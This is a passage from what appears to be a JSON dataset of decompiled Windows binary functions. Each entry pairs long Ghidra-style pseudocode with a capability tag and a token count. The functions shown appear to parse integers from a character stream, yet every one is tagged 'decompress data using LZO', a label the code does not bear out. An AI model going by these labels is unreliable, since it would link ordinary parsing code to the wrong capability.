var_4fh = 0;\n            var_48h = 0;\ncode_r0x004458f0:\n            cVar2 = uVar12;\n            iVar6 = cVar2;\n            if (stack0xffffffb0 < 0xb) {\n                if ((cVar2 < '0') || (var_4dh._1_1_ + '0' <= cVar2)) goto code_r0x00445b93;\n            }\n            else if (9 < cVar2 - 0x30U) goto code_r0x00445b7c;\n            iVar6 = iVar6 + -0x30;\ncode_r0x00445912:\n            if (iVar6 != -1) {\n                do {\n                    if (uVar4 / uVar13 < var_48h) {\n                        var_4fh = 1;\n                        uVar12 = arg_8h[2];\n                        if (arg_8h[3] <= uVar12) goto code_r0x00445c33;\ncode_r0x0044594f:\n                        arg_8h[2] = uVar12 + 1;\ncode_r0x0044595c:\n                        var_4eh = false;\n                        if (arg_8h[3] <= arg_8h[2]) {\n                            iVar6 = (**(*arg_8h + 0x24))();\n                            var_4eh = false;\n                            if (iVar6 == -1) {\n                                arg_8h = NULL;\n                                var_4eh = true;\n                            }\n                        }\n                    }\n                    else {\n                        uVar12 = var_48h * uVar13;\n                        var_48h = iVar6 + uVar12;\n                        var_4fh = var_4fh | uVar4 - iVar6 < uVar12;\n                        uVar12 = arg_8h[2];\n                        var_44h = var_44h + 1;\n                        if (uVar12 < arg_8h[3]) goto code_r0x0044594f;\ncode_r0x00445c33:\n                        (**(*arg_8h + 0x28))();\n                        if (arg_8h != NULL) goto code_r0x0044595c;\n                        var_4eh = true;\n                    }\n                    arg_ch = 0xffffffff;\n                    bVar10 = arg_10h != NULL && arg_14h == -1;\n                    bVar8 = arg_14h == -1;\n                    if ((bVar10) && (bVar8 = false,  arg_10h[3] <= arg_10h[2])) {\n                        iVar6 = (**(*arg_10h + 0x24))();\n                        bVar8 = false;\n                        if (iVar6 == -1) {\n                            arg_10h = NULL;\n                            bVar8 = bVar10;\n                        }\n                    }\n                    if (bVar8 == var_4eh) {\n                        var_4eh = 1;\n                        goto code_r0x00445993;\n                    }\n                    uVar12 = arg_ch;\n                    if (arg_8h == NULL) goto code_r0x004458f0;\n                    if (arg_8h[2] < arg_8h[3]) {\n                        uVar12 = *arg_8h[2];\n                        goto code_r0x004458f0;\n                    }\n                    uVar12 = (**(*arg_8h + 0x24))();\n                    if (uVar12 != 0xffffffff) goto code_r0x004458f0;\n                    arg_8h = NULL;\n                    if (stack0xffffffb0 < 0xb) break;\n                    cVar2 = -1;\n                    iVar6 = -1;\ncode_r0x00445b7c:\n                    if (5 < cVar2 + 0x9fU) goto code_r0x00445cf0;\n                    iVar6 = iVar6 + -0x57;\n                    if (iVar6 == -1) break;\n                } while( true );\n            }\n            goto code_r0x00445b93;\n        }\n        var_4eh = var_4dh;\n        var_4fh = 0;\n        var_4dh._0_1_ = 0;\n        var_48h = 0;\n    }\n    else {\n        if (var_4dh == 0) {\n            var_4fh = 0;\n            var_48h = 0;\ncode_r0x00445d5b:\n            uVar5 = var_2ch;\n            cVar2 = uVar12;\n            if ((*(iVar3 + 0x10) == 0) || (*(iVar3 + 0x25) != cVar2)) {\n                if ((cVar2 == *(iVar3 + 0x24)) ||\n                   (iVar6 = sub.msvcrt.dll_memchr(iVar3 + 0x4e, cVar2, stack0xffffffb0),  iVar6 == 0))\n                goto code_r0x00445b93;\n                iVar6 = iVar6 - (iVar3 + 0x4e);\n                if (0xf < iVar6) {\n                    iVar6 = iVar6 + -6;\n                }\n                if (var_48h <= uVar4 / uVar13) {\n                    uVar12 = var_48h * uVar13;\n                    var_48h = iVar6 + uVar12;\n                    var_4fh = var_4fh | uVar4 - iVar6 < uVar12;\n                    var_44h = var_44h + 1;\n                    goto code_r0x00445dc3;\n                }\n                uVar12 = arg_8h[2];\n                var_4fh = var_4eh;\n                if (arg_8h[3] <= uVar12) goto code_r0x00445e22;\ncode_r0x00445dce:\n                arg_8h[2] = uVar12 + 1;\ncode_r0x00445ddb:\n                var_60h._0_1_ = 0;\n                if (arg_8h[3] <= arg_8h[2]) {\n                    iVar6 = (**(*arg_8h + 0x24))();\n                    var_60h._0_1_ = 0;\n                    if (iVar6 == -1) {\n                        arg_8h = NULL;\n                        var_60h._0_1_ = var_4eh;\n                    }\n                }\n            }\n            else {\n                if (var_44h == 0) {\n                    var_4eh = 0;\n                    var_4dh._0_1_ = *(iVar3 + 0x10);\n                    goto code_r0x00445993;\n                }\n                uVar12 = var_2ch + 1;\n                uVar9 = 0xf;\n                if (stack0xffffffcc != &var_28h) {\n                    uVar9 = var_28h;\n                }\n                if (uVar9 < uVar12) {\n                    fcn.00492830(var_2ch, 0, 0, 1);\n                }\n                var_44h = 0;\n                *(stack0xffffffcc + uVar5) = var_44h;\n                *(stack0xffffffcc + uVar12) = 0;\n                var_2ch = uVar12;\ncode_r0x00445dc3:\n                uVar12 = arg_8h[2];\n                if (uVar12 < arg_8h[3]) goto code_r0x00445dce;\ncode_r0x00445e22:\n                (**(*arg_8h + 0x28))();\n                var_60h._0_1_ = var_4eh;\n                if (arg_8h != NULL) goto code_r0x00445ddb;\n            }\n            arg_ch = 0xffffffff;\n            bVar10 = arg_10h != NULL && arg_14h == -1;\n            bVar8 = arg_14h == -1;\n            if ((bVar10) && (bVar8 = false,  arg_10h[3] <= arg_10h[2])) {\n                iVar6 = (**(*arg_10h + 0x24))();\n                bVar8 = false;\n                if (iVar6 == -1) {\n                    arg_10h = NULL;\n                    bVar8 = bVar10;\n                }\n            }\n            if (bVar8 == var_60h) goto code_r0x00445993;\n            uVar12 = arg_ch;\n            if (arg_8h != NULL) {\n                if (arg_8h[2] < arg_8h[3]) {\n                    uVar12 = *arg_8h[2];\n                }\n                else {\n                    uVar12 = (**(*arg_8h + 0x24))();\n                    if (uVar12 == 0xffffffff) {\n                        arg_8h = NULL;\n                        uVar12 = 0xffffffff;\n                    }\n                }\n            }\n            goto code_r0x00445d5b;\n        }\n        var_48h = 0;\n        var_4fh = 0;\n        var_4eh = var_4dh;\n        var_4dh._0_1_ = 0;\n    }\ncode_r0x00445993:\n    if (var_2ch != 0) goto code_r0x00445ba2;\ncode_r0x0044599b:\n    if ((var_44h != 0) || (bVar7)) {\ncode_r0x00445be7:\n        if (var_4dh == 0) {\n            if (var_4fh == 0) {\n                uVar4 = -var_48h;\n                if (!bVar14) {\n                    uVar4 = var_48h;\n                }\n                *arg_20h = uVar4;\n            }\n            else {\n                *arg_20h = bVar14 + 0x7fffffff;\n                *arg_1ch = 4;\n            }\n            goto code_r0x004459c2;\n        }\n    }\ncode_r0x004459b0:\n    *arg_20h = 0;\n    *arg_1ch = 4;\ncode_r0x004459c2:\n    if (var_4eh != 0) {\n        *arg_1ch = *arg_1ch | 2;\n    }\n    if (stack0xffffffcc != &var_28h) {\n        fcn.004a34c0(stack0xffffffcc);\n    }\n    return CONCAT44(arg_ch, arg_8h);\ncode_r0x00445cf0:\n    if (5 < cVar2 + 0xbfU) goto code_r0x00445b93;\n    iVar6 = iVar6 + -0x37;\n    goto code_r0x00445912;\ncode_r0x00445b93:\n    var_4eh = 0;\n    if (var_2ch == 0) goto code_r0x0044599b;\ncode_r0x00445ba2:\n    fcn.004929c0(var_44h);\n    cVar2 = fcn.0049e840(*(iVar3 + 8), *(iVar3 + 0xc), &var_31h + 1);\n    if (cVar2 == '\\0') {\n        *arg_1ch = 4;\n    }\n    if ((bVar7) || ((var_44h | var_2ch) != 0)) goto code_r0x00445be7;\n    goto code_r0x004459b0;\n}\n",
        "token_count": 4919
    },
    "004461d0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nulong __cdecl\nfcn.004461d0(int32_t *arg_8h, uint32_t arg_ch, int32_t *arg_10h, int32_t arg_14h, int32_t arg_18h, uint32_t *arg_1ch, \n            uint32_t *arg_20h)\n\n{\n    uint8_t uVar1;\n    char cVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    bool bVar6;\n    bool bVar7;\n    uint32_t uVar8;\n    bool bVar9;\n    char cVar10;\n    uint32_t uVar11;\n    uint32_t uVar12;\n    uint32_t uVar13;\n    bool bVar14;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint32_t var_4ch;\n    uint32_t var_48h;\n    uint32_t var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint *var_31h;\n    uint32_t var_2ch;\n    uint32_t var_28h;\n    uint var_ch;\n    \n    iVar5 = arg_18h;\n    uVar13 = 8;\n    iVar3 = fcn.0042e410(arg_18h + 0x6c);\n    uVar4 = *(iVar5 + 0xc) & 0x4a;\n    if ((uVar4 != 0x40) && (uVar13 = 10,  uVar4 == 8)) {\n        uVar13 = 0x10;\n    }\n    bVar6 = arg_8h != NULL && arg_ch == 0xffffffff;\n    bVar14 = arg_ch == 0xffffffff;\n    if (((bVar6) && (bVar14 = false,  arg_8h[3] <= arg_8h[2])) && (iVar5 = (**(*arg_8h + 0x24))(),  iVar5 == -1)) {\n        arg_8h = NULL;\n        bVar14 = bVar6;\n    }\n    bVar6 = arg_10h != NULL && arg_14h == -1;\n    var_44h._0_1_ = arg_14h == -1;\n    if ((bVar6) && (var_44h._0_1_ = false,  arg_10h[3] <= arg_10h[2])) {\n        iVar5 = (**(*arg_10h + 0x24))();\n        var_44h._0_1_ = false;\n        if (iVar5 == -1) {\n            arg_10h = NULL;\n            var_44h._0_1_ = bVar6;\n        }\n    }\n    if (var_44h == bVar14) {\n        bVar14 = false;\n        uVar12 = 0;\n        var_50h._3_1_ = 1;\n        var_44h = 0;\n        bVar6 = false;\n    }\n    else {\n        uVar12 = arg_ch;\n        if ((arg_ch == 0xffffffff) && (arg_8h != NULL)) {\n            if (arg_8h[3] <= arg_8h[2]) {\n                uVar12 = (**(*arg_8h + 0x24))();\n                if (uVar12 == 0xffffffff) {\n                    arg_8h = NULL;\n                    uVar12 = 0xffffffff;\n                }\n                goto code_r0x00446260;\n            }\n            uVar1 = *arg_8h[2];\n            uVar12 = uVar1;\n            cVar2 = *(iVar3 + 0x10);\n            bVar14 = *(iVar3 + 0x4a) == uVar1;\n            if (!bVar14) goto code_r0x00446270;\ncode_r0x00446279:\n            if (((cVar2 == '\\0') || (*(iVar3 + 0x25) != uVar12)) && (*(iVar3 + 0x24) != uVar12)) {\n                if (arg_8h[2] < arg_8h[3]) {\n                    arg_8h[2] = arg_8h[2] + 1;\n                }\n                else {\n                    (**(*arg_8h + 0x28))();\n                }\n                arg_ch = 0xffffffff;\n                var_50h._3_1_ = fcn.00430ce0(&arg_10h);\n                var_44h = 0;\n                bVar6 = false;\n                if (var_50h._3_1_ != 0) goto code_r0x004462d0;\n                uVar12 = fcn.00430d80();\n                cVar2 = *(iVar3 + 0x10);\n            }\n        }\n        else {\ncode_r0x00446260:\n            cVar2 = *(iVar3 + 0x10);\n            bVar14 = *(iVar3 + 0x4a) == uVar12;\n            if (bVar14) goto code_r0x00446279;\ncode_r0x00446270:\n            if (*(iVar3 + 0x4b) == uVar12) goto code_r0x00446279;\n            bVar14 = false;\n        }\n        var_44h = 0;\n        bVar6 = false;\n        while (((cVar10 = uVar12,  cVar2 == '\\0' || (*(iVar3 + 0x25) != cVar10)) && (*(iVar3 + 0x24) != cVar10))) {\n            if (*(iVar3 + 0x4e) == cVar10) {\n                bVar7 = uVar13 == 10 | bVar6 ^ 1U;\n                if (!bVar7) goto code_r0x0044648a;\n                bVar6 = uVar4 == 0 || uVar13 == 8;\n                if (uVar4 != 0 && uVar13 != 8) {\n                    var_44h = var_44h + 1;\n                    goto code_r0x004464be;\n                }\n                var_44h = 0;\n                uVar13 = 8;\n                uVar11 = arg_8h[2];\n                if (arg_8h[3] <= uVar11) goto code_r0x00446560;\ncode_r0x004464cd:\n                arg_8h[2] = uVar11 + 1;\ncode_r0x004464da:\n                var_48h._0_1_ = false;\n                if ((arg_8h[3] <= arg_8h[2]) && (iVar5 = (**(*arg_8h + 0x24))(),  iVar5 == -1)) {\n                    arg_8h = NULL;\n                    var_48h._0_1_ = true;\n                }\n            }\n            else {\n                if (!bVar6) break;\ncode_r0x0044648a:\n                if ((*(iVar3 + 0x4c) != cVar10) && (*(iVar3 + 0x4d) != cVar10)) {\n                    var_50h._3_1_ = 0;\n                    bVar6 = true;\n                    goto code_r0x004462d0;\n                }\n                var_50h._3_1_ = uVar13 == 0x10 || uVar4 == 0;\n                if (uVar13 != 0x10 && uVar4 != 0) {\n                    bVar6 = true;\n                    goto code_r0x004462dc;\n                }\n                var_44h = 0;\n                uVar13 = 0x10;\n                bVar7 = false;\ncode_r0x004464be:\n                uVar11 = arg_8h[2];\n                bVar6 = bVar7;\n                if (uVar11 < arg_8h[3]) goto code_r0x004464cd;\ncode_r0x00446560:\n                (**(*arg_8h + 0x28))();\n                if (arg_8h != NULL) goto code_r0x004464da;\n                var_48h._0_1_ = true;\n            }\n            arg_ch = 0xffffffff;\n            bVar9 = arg_10h != NULL && arg_14h == -1;\n            bVar7 = arg_14h == -1;\n            if ((bVar9) && (bVar7 = false,  arg_10h[3] <= arg_10h[2])) {\n                iVar5 = (**(*arg_10h + 0x24))();\n                bVar7 = false;\n                if (iVar5 == -1) {\n                    arg_10h = NULL;\n                    bVar7 = bVar9;\n                }\n            }\n            if (var_48h._0_1_ == bVar7) {\n                var_50h._3_1_ = 1;\n                goto code_r0x004462d0;\n            }\n            uVar12 = arg_ch;\n            if (arg_8h != NULL) {\n                if (arg_8h[2] < arg_8h[3]) {\n                    uVar12 = *arg_8h[2];\n                }\n                else {\n                    uVar12 = (**(*arg_8h + 0x24))();\n                    if (uVar12 == 0xffffffff) {\n                        arg_8h = NULL;\n                        uVar12 = 0xffffffff;\n                    }\n                }\n            }\n            if (!bVar6) break;\n            cVar2 = *(iVar3 + 0x10);\n        }\n        var_50h._3_1_ = 0;\n    }\ncode_r0x004462d0:\n    var_4ch = 0x16;\n    if (uVar13 != 0x10) {\ncode_r0x004462dc:\n        var_4ch = uVar13;\n    }\n    unique0x00001d00 = &var_28h;\n    var_2ch = 0;\n    var_28h = var_28h & 0xffffff00;\n    if (*(iVar3 + 0x10) != '\\0') {\n        fcn.004924e0(0x20);\n    }\n    uVar4 = 0xffffffff / uVar13;\n    var_50h._2_1_ = *(iVar3 + 100);\n    if (var_50h._2_1_ == 0) {\n        if (var_50h._3_1_ == 0) {\n            var_50h._1_1_ = 0;\n            var_48h = 0;\ncode_r0x00446334:\n            cVar2 = uVar12;\n            iVar5 = cVar2;\n            if (var_4ch < 0xb) {\n                if ((cVar2 < '0') || (var_4ch + '0' <= cVar2)) goto code_r0x004465d3;\n            }\n            else if (9 < cVar2 - 0x30U) goto code_r0x004465bc;\n            uVar12 = iVar5 - 0x30;\ncode_r0x00446356:\n            if (uVar12 != 0xffffffff) {\n                do {\n                    if (uVar4 < var_48h) {\n                        var_50h._1_1_ = 1;\n                        uVar12 = arg_8h[2];\n                        if (arg_8h[3] <= uVar12) goto code_r0x00446665;\ncode_r0x00446392:\n                        arg_8h[2] = uVar12 + 1;\ncode_r0x0044639f:\n                        var_50h._2_1_ = false;\n                        if (arg_8h[3] <= arg_8h[2]) {\n                            iVar5 = (**(*arg_8h + 0x24))();\n                            var_50h._2_1_ = false;\n                            if (iVar5 == -1) {\n                                arg_8h = NULL;\n                                var_50h._2_1_ = true;\n                            }\n                        }\n                    }\n                    else {\n                        uVar11 = var_48h * uVar13;\n                        var_48h = uVar12 + uVar11;\n                        var_50h._1_1_ = var_50h._1_1_ | ~uVar12 < uVar11;\n                        uVar12 = arg_8h[2];\n                        var_44h = var_44h + 1;\n                        if (uVar12 < arg_8h[3]) goto code_r0x00446392;\ncode_r0x00446665:\n                        (**(*arg_8h + 0x28))();\n                        if (arg_8h != NULL) goto code_r0x0044639f;\n                        var_50h._2_1_ = true;\n                    }\n                    arg_ch = 0xffffffff;\n                    bVar9 = arg_10h != NULL && arg_14h == -1;\n                    bVar7 = arg_14h == -1;\n                    if ((bVar9) && (bVar7 = false,  arg_10h[3] <= arg_10h[2])) {\n                        iVar5 = (**(*arg_10h + 0x24))();\n                        bVar7 = false;\n                        if (iVar5 == -1) {\n                            arg_10h = NULL;\n                            bVar7 = bVar9;\n                        }\n                    }\n                    if (var_50h._2_1_ == bVar7) {\n                        var_50h._2_1_ = 1;\n                        goto code_r0x004463d6;\n                    }\n                    uVar12 = arg_ch;\n                    if (arg_8h == NULL) goto code_r0x00446334;\n                    if (arg_8h[2] < arg_8h[3]) {\n                        uVar12 = *arg_8h[2];\n                        goto code_r0x00446334;\n                    }\n                    uVar12 = (**(*arg_8h + 0x24))();\n                    if (uVar12 != 0xffffffff) goto code_r0x00446334;\n                    arg_8h = NULL;\n                    if (var_4ch < 0xb) break;\n                    cVar2 = -1;\n                    iVar5 = -1;\ncode_r0x004465bc:\n                    if (5 < cVar2 + 0x9fU) goto code_r0x00446720;\n                    uVar12 = iVar5 - 0x57;\n                    if (uVar12 == 0xffffffff) break;\n                } while( true );\n            }\n            goto code_r0x004465d3;\n        }\n        var_50h._2_1_ = var_50h._3_1_;\n        var_50h._1_1_ = 0;\n        var_50h._3_1_ = 0;\n        var_48h = 0;\n    }\n    else {\n        if (var_50h._3_1_ == 0) {\n            var_50h._1_1_ = 0;\n            var_48h = 0;\ncode_r0x0044678b:\n            uVar11 = var_2ch;\n            cVar2 = uVar12;\n            if ((*(iVar3 + 0x10) == 0) || (*(iVar3 + 0x25) != cVar2)) {\n                if ((cVar2 == *(iVar3 + 0x24)) ||\n                   (iVar5 = sub.msvcrt.dll_memchr(iVar3 + 0x4e, cVar2, var_4ch),  iVar5 == 0)) goto code_r0x004465d3;\n                uVar12 = iVar5 - (iVar3 + 0x4e);\n                if (0xf < uVar12) {\n                    uVar12 = uVar12 - 6;\n                }\n                if (var_48h <= uVar4) {\n                    uVar11 = var_48h * uVar13;\n                    var_48h = uVar12 + uVar11;\n                    var_50h._1_1_ = var_50h._1_1_ | ~uVar12 < uVar11;\n                    var_44h = var_44h + 1;\n                    goto code_r0x004467f2;\n                }\n                uVar12 = arg_8h[2];\n                var_50h._1_1_ = var_50h._2_1_;\n                if (arg_8h[3] <= uVar12) goto code_r0x00446852;\ncode_r0x004467fd:\n                arg_8h[2] = uVar12 + 1;\ncode_r0x0044680a:\n                var_5ch._0_1_ = 0;\n                if (arg_8h[3] <= arg_8h[2]) {\n                    iVar5 = (**(*arg_8h + 0x24))();\n                    var_5ch._0_1_ = 0;\n                    if (iVar5 == -1) {\n                        arg_8h = NULL;\n                        var_5ch._0_1_ = var_50h._2_1_;\n                    }\n                }\n            }\n            else {\n                if (var_44h == 0) {\n                    var_50h._2_1_ = 0;\n                    var_50h._3_1_ = *(iVar3 + 0x10);\n                    goto code_r0x004463d6;\n                }\n                uVar12 = var_2ch + 1;\n                uVar8 = 0xf;\n                if (stack0xffffffcc != &var_28h) {\n                    uVar8 = var_28h;\n                }\n                if (uVar8 < uVar12) {\n                    fcn.00492830(var_2ch, 0, 0, 1);\n                }\n                var_44h = 0;\n                *(stack0xffffffcc + uVar11) = var_44h;\n                *(stack0xffffffcc + uVar12) = 0;\n                var_2ch = uVar12;\ncode_r0x004467f2:\n                uVar12 = arg_8h[2];\n                if (uVar12 < arg_8h[3]) goto code_r0x004467fd;\ncode_r0x00446852:\n                (**(*arg_8h + 0x28))();\n                var_5ch._0_1_ = var_50h._2_1_;\n                if (arg_8h != NULL) goto code_r0x0044680a;\n            }\n            arg_ch = 0xffffffff;\n            bVar9 = arg_10h != NULL && arg_14h == -1;\n            bVar7 = arg_14h == -1;\n            if ((bVar9) && (bVar7 = false,  arg_10h[3] <= arg_10h[2])) {\n                iVar5 = (**(*arg_10h + 0x24))();\n                bVar7 = false;\n                if (iVar5 == -1) {\n                    arg_10h = NULL;\n                    bVar7 = bVar9;\n                }\n            }\n            if (var_5ch == bVar7) goto code_r0x004463d6;\n            uVar12 = arg_ch;\n            if (arg_8h != NULL) {\n                if (arg_8h[2] < arg_8h[3]) {\n                    uVar12 = *arg_8h[2];\n                }\n                else {\n                    uVar12 = (**(*arg_8h + 0x24))();\n                    if (uVar12 == 0xffffffff) {\n                        arg_8h = NULL;\n                        uVar12 = 0xffffffff;\n                    }\n                }\n            }\n            goto code_r0x0044678b;\n        }\n        var_48h = 0;\n        var_50h._1_1_ = 0;\n        var_50h._2_1_ = var_50h._3_1_;\n        var_50h._3_1_ = 0;\n    }\ncode_r0x004463d6:\n    if (var_2ch != 0) goto code_r0x004465e2;\ncode_r0x004463de:\n    if ((var_44h != 0) || (bVar6)) {\ncode_r0x00446627:\n        if (var_50h._3_1_ == 0) {\n            if (var_50h._1_1_ == 0) {\n                uVar4 = -var_48h;\n                if (!bVar14) {\n                    uVar4 = var_48h;\n                }\n                *arg_20h = uVar4;\n            }\n            else {\n                *arg_20h = 0xffffffff;\n                *arg_1ch = 4;\n            }\n            goto code_r0x00446405;\n        }\n    }\ncode_r0x004463f3:\n    *arg_20h = 0;\n    *arg_1ch = 4;\ncode_r0x00446405:\n    if (var_50h._2_1_ != 0) {\n        *arg_1ch = *arg_1ch | 2;\n    }\n    if (stack0xffffffcc != &var_28h) {\n        fcn.004a34c0(stack0xffffffcc);\n    }\n    return CONCAT44(arg_ch, arg_8h);\ncode_r0x00446720:\n    if (5 < cVar2 + 0xbfU) goto code_r0x004465d3;\n    uVar12 = iVar5 - 0x37;\n    goto code_r0x00446356;\ncode_r0x004465d3:\n    var_50h._2_1_ = 0;\n    if (var_2ch == 0) goto code_r0x004463de;\ncode_r0x004465e2:\n    fcn.004929c0(var_44h);\n    cVar2 = fcn.0049e840(*(iVar3 + 8), *(iVar3 + 0xc), &var_31h + 1);\n    if (cVar2 == '\\0') {\n        *arg_1ch = 4;\n    }\n    if ((bVar6) || ((var_44h | var_2ch) != 0)) goto code_r0x00446627;\n    goto code_r0x004463f3;\n}\n",
        "token_count": 5002
    },
    "00446c00": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nulong __cdecl\nfcn.00446c00(int32_t *arg_8h, uint32_t arg_ch, int32_t *arg_10h, int32_t arg_14h, int32_t arg_18h, uint32_t *arg_1ch, \n            uint16_t *arg_20h)\n\n{\n    uint8_t uVar1;\n    bool bVar2;\n    char cVar3;\n    uint16_t uVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    bool bVar8;\n    int32_t iVar9;\n    bool bVar10;\n    bool bVar11;\n    char cVar12;\n    uint32_t uVar13;\n    uint32_t uVar14;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint32_t var_4ch;\n    uint32_t var_48h;\n    uint32_t var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint *var_31h;\n    uint32_t var_2ch;\n    uint32_t var_28h;\n    uint var_ch;\n    \n    iVar9 = arg_18h;\n    uVar14 = 8;\n    iVar5 = fcn.0042e410(arg_18h + 0x6c);\n    uVar6 = *(iVar9 + 0xc) & 0x4a;\n    if ((uVar6 != 0x40) && (uVar14 = 10,  uVar6 == 8)) {\n        uVar14 = 0x10;\n    }\n    bVar8 = arg_8h != NULL && arg_ch == 0xffffffff;\n    bVar10 = arg_ch == 0xffffffff;\n    if (((bVar8) && (bVar10 = false,  arg_8h[3] <= arg_8h[2])) && (iVar9 = (**(*arg_8h + 0x24))(),  iVar9 == -1)) {\n        arg_8h = NULL;\n        bVar10 = bVar8;\n    }\n    bVar8 = arg_10h != NULL && arg_14h == -1;\n    var_44h._0_1_ = arg_14h == -1;\n    if ((bVar8) && (var_44h._0_1_ = false,  arg_10h[3] <= arg_10h[2])) {\n        iVar9 = (**(*arg_10h + 0x24))();\n        var_44h._0_1_ = false;\n        if (iVar9 == -1) {\n            arg_10h = NULL;\n            var_44h._0_1_ = bVar8;\n        }\n    }\n    if (var_44h == bVar10) {\n        bVar8 = false;\n        uVar13 = 0;\n        var_50h._3_1_ = 1;\n        var_44h = 0;\n        bVar10 = false;\n    }\n    else {\n        uVar13 = arg_ch;\n        if ((arg_ch == 0xffffffff) && (arg_8h != NULL)) {\n            if (arg_8h[3] <= arg_8h[2]) {\n                uVar13 = (**(*arg_8h + 0x24))();\n                if (uVar13 == 0xffffffff) {\n                    arg_8h = NULL;\n                    uVar13 = 0xffffffff;\n                }\n                goto code_r0x00446c90;\n            }\n            uVar1 = *arg_8h[2];\n            uVar13 = uVar1;\n            cVar3 = *(iVar5 + 0x10);\n            bVar8 = *(iVar5 + 0x4a) == uVar1;\n            if (!bVar8) goto code_r0x00446ca0;\ncode_r0x00446ca9:\n            if (((cVar3 == '\\0') || (*(iVar5 + 0x25) != uVar13)) && (*(iVar5 + 0x24) != uVar13)) {\n                if (arg_8h[2] < arg_8h[3]) {\n                    arg_8h[2] = arg_8h[2] + 1;\n                }\n                else {\n                    (**(*arg_8h + 0x28))();\n                }\n                arg_ch = 0xffffffff;\n                var_50h._3_1_ = fcn.00430ce0(&arg_10h);\n                var_44h = 0;\n                bVar10 = false;\n                if (var_50h._3_1_ != 0) goto code_r0x00446d00;\n                uVar13 = fcn.00430d80();\n                cVar3 = *(iVar5 + 0x10);\n            }\n        }\n        else {\ncode_r0x00446c90:\n            cVar3 = *(iVar5 + 0x10);\n            bVar8 = *(iVar5 + 0x4a) == uVar13;\n            if (bVar8) goto code_r0x00446ca9;\ncode_r0x00446ca0:\n            if (*(iVar5 + 0x4b) == uVar13) goto code_r0x00446ca9;\n            bVar8 = false;\n        }\n        var_44h = 0;\n        bVar10 = false;\n        while (((cVar12 = uVar13,  cVar3 == '\\0' || (*(iVar5 + 0x25) != cVar12)) && (*(iVar5 + 0x24) != cVar12))) {\n            if (*(iVar5 + 0x4e) == cVar12) {\n                bVar2 = uVar14 == 10 | bVar10 ^ 1U;\n                if (!bVar2) goto code_r0x00446eba;\n                bVar10 = uVar6 == 0 || uVar14 == 8;\n                if (uVar6 != 0 && uVar14 != 8) {\n                    var_44h = var_44h + 1;\n                    goto code_r0x00446eee;\n                }\n                var_44h = 0;\n                uVar14 = 8;\n                uVar7 = arg_8h[2];\n                if (arg_8h[3] <= uVar7) goto code_r0x00446f90;\ncode_r0x00446efd:\n                arg_8h[2] = uVar7 + 1;\ncode_r0x00446f0a:\n                var_48h._0_1_ = false;\n                if ((arg_8h[3] <= arg_8h[2]) && (iVar9 = (**(*arg_8h + 0x24))(),  iVar9 == -1)) {\n                    arg_8h = NULL;\n                    var_48h._0_1_ = true;\n                }\n            }\n            else {\n                if (!bVar10) break;\ncode_r0x00446eba:\n                if ((*(iVar5 + 0x4c) != cVar12) && (*(iVar5 + 0x4d) != cVar12)) {\n                    var_50h._3_1_ = 0;\n                    bVar10 = true;\n                    goto code_r0x00446d00;\n                }\n                var_50h._3_1_ = uVar14 == 0x10 || uVar6 == 0;\n                if (uVar14 != 0x10 && uVar6 != 0) {\n                    bVar10 = true;\n                    goto code_r0x00446d0c;\n                }\n                var_44h = 0;\n                uVar14 = 0x10;\n                bVar2 = false;\ncode_r0x00446eee:\n                uVar7 = arg_8h[2];\n                bVar10 = bVar2;\n                if (uVar7 < arg_8h[3]) goto code_r0x00446efd;\ncode_r0x00446f90:\n                (**(*arg_8h + 0x28))();\n                if (arg_8h != NULL) goto code_r0x00446f0a;\n                var_48h._0_1_ = true;\n            }\n            arg_ch = 0xffffffff;\n            bVar2 = arg_10h != NULL && arg_14h == -1;\n            var_50h._2_1_ = arg_14h == -1;\n            if ((bVar2) && (var_50h._2_1_ = false,  arg_10h[3] <= arg_10h[2])) {\n                var_50h._2_1_ = false;\n                iVar9 = (**(*arg_10h + 0x24))();\n                if (iVar9 == -1) {\n                    arg_10h = NULL;\n                    var_50h._2_1_ = bVar2;\n                }\n            }\n            if (var_48h._0_1_ == var_50h._2_1_) {\n                var_50h._3_1_ = 1;\n                goto code_r0x00446d00;\n            }\n            uVar13 = arg_ch;\n            if (arg_8h != NULL) {\n                if (arg_8h[2] < arg_8h[3]) {\n                    uVar13 = *arg_8h[2];\n                }\n                else {\n                    uVar13 = (**(*arg_8h + 0x24))();\n                    if (uVar13 == 0xffffffff) {\n                        arg_8h = NULL;\n                        uVar13 = 0xffffffff;\n                    }\n                }\n            }\n            if (!bVar10) break;\n            cVar3 = *(iVar5 + 0x10);\n        }\n        var_50h._3_1_ = 0;\n    }\ncode_r0x00446d00:\n    var_4ch = 0x16;\n    if (uVar14 != 0x10) {\ncode_r0x00446d0c:\n        var_4ch = uVar14;\n    }\n    uVar1 = var_50h._3_1_;\n    unique0x00001d00 = &var_28h;\n    var_2ch = 0;\n    var_28h = var_28h & 0xffffff00;\n    if (*(iVar5 + 0x10) != '\\0') {\n        fcn.004924e0(0x20);\n    }\n    var_50h._2_1_ = *(iVar5 + 100);\n    var_54h._0_2_ = 0xffff / uVar14;\n    if (var_50h._2_1_ == 0) {\n        if (var_50h._3_1_ == 0) {\n            var_50h._1_1_ = 0;\n            var_48h = 0;\ncode_r0x00446d62:\n            cVar3 = uVar13;\n            iVar9 = cVar3;\n            if (var_4ch < 0xb) {\n                if ((cVar3 < '0') || (var_4ch + '0' <= cVar3)) goto code_r0x00447002;\n            }\n            else if (9 < cVar3 - 0x30U) goto code_r0x00446feb;\n            iVar9 = iVar9 + -0x30;\ncode_r0x00446d84:\n            if (iVar9 != -1) {\n                do {\n                    if (var_54h < var_48h) {\n                        var_50h._1_1_ = 1;\n                        uVar6 = arg_8h[2];\n                        if (arg_8h[3] <= uVar6) goto code_r0x00447096;\ncode_r0x00446dc9:\n                        arg_8h[2] = uVar6 + 1;\ncode_r0x00446dd6:\n                        var_50h._2_1_ = 